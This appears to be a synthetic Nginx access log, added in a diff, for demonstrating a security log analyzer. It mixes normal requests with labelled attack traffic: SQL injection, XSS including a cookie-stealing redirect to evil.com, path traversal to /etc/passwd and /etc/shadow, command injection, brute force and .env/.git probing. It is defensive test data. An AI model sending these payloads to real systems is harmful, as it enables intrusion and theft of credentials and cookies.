@@ -1,0 +1,54 @@
+# Nginx Access Log - Sample with Attack Patterns
+# Generated for Security Log Analyzer Demo
+192.168.1.100 - - [15/Jan/2024:08:00:00 +0000] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+192.168.1.101 - - [15/Jan/2024:08:00:15 +0000] "GET /api/health HTTP/1.1" 200 32 "-" "HealthChecker/1.0"
+192.168.1.102 - user1 [15/Jan/2024:08:01:00 +0000] "GET /dashboard HTTP/1.1" 200 4096 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X)"
+# SQL Injection via POST parameters
+45.33.32.156 - - [15/Jan/2024:09:00:00 +0000] "POST /api/login HTTP/1.1" 401 64 "-" "python-requests/2.28.0"
+45.33.32.156 - - [15/Jan/2024:09:00:01 +0000] "POST /api/login HTTP/1.1" 500 128 "-" "python-requests/2.28.0"
+45.33.32.156 - - [15/Jan/2024:09:00:02 +0000] "GET /users?id=1%27%20OR%20%271%27=%271 HTTP/1.1" 200 8192 "-" "sqlmap/1.5.2"
+45.33.32.156 - - [15/Jan/2024:09:00:03 +0000] "GET /users?id=1%20UNION%20SELECT%20*%20FROM%20passwords HTTP/1.1" 500 64 "-" "sqlmap/1.5.2"
+45.33.32.156 - - [15/Jan/2024:09:00:04 +0000] "GET /api/v2/data?query=SELECT%20*%20FROM%20users%20WHERE%201=1 HTTP/1.1" 403 32 "-" "sqlmap/1.5.2"
+# XSS via URL parameters
+103.45.67.89 - - [15/Jan/2024:09:30:00 +0000] "GET /search?q=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E HTTP/1.1" 200 512 "-" "Mozilla/5.0"
+103.45.67.89 - - [15/Jan/2024:09:30:05 +0000] "GET /profile?name=%3Csvg%20onload=alert%281%29%3E HTTP/1.1" 200 256 "-" "Mozilla/5.0"
+103.45.67.89 - - [15/Jan/2024:09:30:10 +0000] "GET /page?redirect=javascript:document.location=%27http://evil.com/%27%2Bdocument.cookie HTTP/1.1" 302 0 "-" "Mozilla/5.0"
+# Directory traversal
+185.220.101.45 - - [15/Jan/2024:10:00:00 +0000] "GET /files/..%2f..%2f..%2fetc%2fpasswd HTTP/1.1" 403 64 "-" "curl/7.68.0"
+185.220.101.45 - - [15/Jan/2024:10:00:01 +0000] "GET /download?file=....//....//....//etc/shadow HTTP/1.1" 403 64 "-" "curl/7.68.0"
+185.220.101.45 - - [15/Jan/2024:10:00:02 +0000] "GET /static/%252e%252e/%252e%252e/%252e%252e/etc/passwd HTTP/1.1" 200 1024 "-" "curl/7.68.0"
+185.220.101.45 - - [15/Jan/2024:10:00:03 +0000] "GET /api/file?path=/proc/self/environ HTTP/1.1" 403 32 "-" "curl/7.68.0"
+185.220.101.45 - - [15/Jan/2024:10:00:04 +0000] "GET /images/../../../.git/config HTTP/1.1" 200 256 "-" "curl/7.68.0"
+# Brute force on API endpoint
+91.121.45.67 - - [15/Jan/2024:11:00:00 +0000] "POST /api/authenticate HTTP/1.1" 401 32 "-" "Go-http-client/1.1"
+91.121.45.67 - - [15/Jan/2024:11:00:01 +0000] "POST /api/authenticate HTTP/1.1" 401 32 "-" "Go-http-client/1.1"
+91.121.45.67 - - [15/Jan/2024:11:00:02 +0000] "POST /api/authenticate HTTP/1.1" 401 32 "-" "Go-http-client/1.1"
+91.121.45.67 - - [15/Jan/2024:11:00:03 +0000] "POST /api/authenticate HTTP/1.1" 401 32 "-" "Go-http-client/1.1"
+91.121.45.67 - - [15/Jan/2024:11:00:04 +0000] "POST /api/authenticate HTTP/1.1" 401 32 "-" "Go-http-client/1.1"
+91.121.45.67 - - [15/Jan/2024:11:00:05 +0000] "POST /api/authenticate HTTP/1.1" 401 32 "-" "Go-http-client/1.1"
+91.121.45.67 - - [15/Jan/2024:11:00:06 +0000] "POST /api/authenticate HTTP/1.1" 401 32 "-" "Go-http-client/1.1"
+91.121.45.67 - - [15/Jan/2024:11:00:07 +0000] "POST /api/authenticate HTTP/1.1" 200 512 "-" "Go-http-client/1.1"
+# Normal API traffic
+10.0.0.50 - - [15/Jan/2024:12:00:00 +0000] "GET /api/v2/products HTTP/1.1" 200 16384 "-" "Mozilla/5.0"
+10.0.0.51 - - [15/Jan/2024:12:00:30 +0000] "POST /api/v2/orders HTTP/1.1" 201 256 "-" "Mozilla/5.0"
+10.0.0.52 - - [15/Jan/2024:12:01:00 +0000] "GET /api/v2/inventory HTTP/1.1" 200 8192 "-" "Mozilla/5.0"
+10.0.0.53 - - [15/Jan/2024:12:01:30 +0000] "PUT /api/v2/products/123 HTTP/1.1" 200 128 "-" "Mozilla/5.0"
+# Scanning activity
+141.98.10.56 - - [15/Jan/2024:13:00:00 +0000] "GET /wp-admin HTTP/1.1" 404 64 "-" "WPScan v3.8.22"
+141.98.10.56 - - [15/Jan/2024:13:00:01 +0000] "GET /wp-login.php HTTP/1.1" 404 64 "-" "WPScan v3.8.22"
+141.98.10.56 - - [15/Jan/2024:13:00:02 +0000] "GET /administrator HTTP/1.1" 404 64 "-" "DirBuster-1.0-RC1"
+141.98.10.56 - - [15/Jan/2024:13:00:03 +0000] "GET /phpmyadmin HTTP/1.1" 404 64 "-" "DirBuster-1.0-RC1"
+141.98.10.56 - - [15/Jan/2024:13:00:04 +0000] "GET /.env HTTP/1.1" 200 512 "-" "curl/7.68.0"
+141.98.10.56 - - [15/Jan/2024:13:00:05 +0000] "GET /.git/HEAD HTTP/1.1" 200 32 "-" "curl/7.68.0"
+141.98.10.56 - - [15/Jan/2024:13:00:06 +0000] "GET /config.php HTTP/1.1" 200 1024 "-" "curl/7.68.0"
+141.98.10.56 - - [15/Jan/2024:13:00:07 +0000] "GET /backup.sql HTTP/1.1" 404 64 "-" "curl/7.68.0"
+141.98.10.56 - - [15/Jan/2024:13:00:08 +0000] "GET /database.sql HTTP/1.1" 404 64 "-" "curl/7.68.0"
+# Command injection attempts
+77.88.55.66 - - [15/Jan/2024:14:00:00 +0000] "GET /ping?host=8.8.8.8;cat%20/etc/passwd HTTP/1.1" 500 64 "-" "curl/7.68.0"
+77.88.55.66 - - [15/Jan/2024:14:00:01 +0000] "GET /lookup?domain=example.com%7Cwhoami HTTP/1.1" 500 64 "-" "curl/7.68.0"
+77.88.55.66 - - [15/Jan/2024:14:00:02 +0000] "POST /convert?file=test.pdf%60id%60 HTTP/1.1" 500 64 "-" "curl/7.68.0"
+# Off-hours administrative access
+10.0.0.1 - admin [15/Jan/2024:03:00:00 +0000] "GET /admin/users HTTP/1.1" 200 8192 "-" "Mozilla/5.0"
+10.0.0.1 - admin [15/Jan/2024:03:05:00 +0000] "POST /admin/export-data HTTP/1.1" 200 1048576 "-" "Mozilla/5.0"
+10.0.0.1 - admin [15/Jan/2024:03:10:00 +0000] "DELETE /admin/logs HTTP/1.1" 200 64 "-" "Mozilla/5.0"
+# End of log
